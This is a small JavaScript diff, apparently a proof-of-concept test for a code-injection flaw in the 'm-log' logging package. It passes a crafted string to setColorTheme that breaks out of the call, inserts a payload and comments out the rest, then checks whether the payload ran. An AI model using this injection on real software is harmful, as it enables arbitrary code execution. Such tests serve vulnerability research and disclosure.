@@ -16,7 +16,8 @@ function dummySource(val){
 dummySource(' ');
 
 var logger = require('m-log');
-logger.setColorTheme({c1: ["\"]};" + payload + "//"]});
+// logger.setColorTheme({c1: ["\"]};" + payload + "//"]});
+logger.setColorTheme("});" + payload + "//");
 
 if (console["my-awesome-prop-23-42"]){
     console.log("payload was delivered");
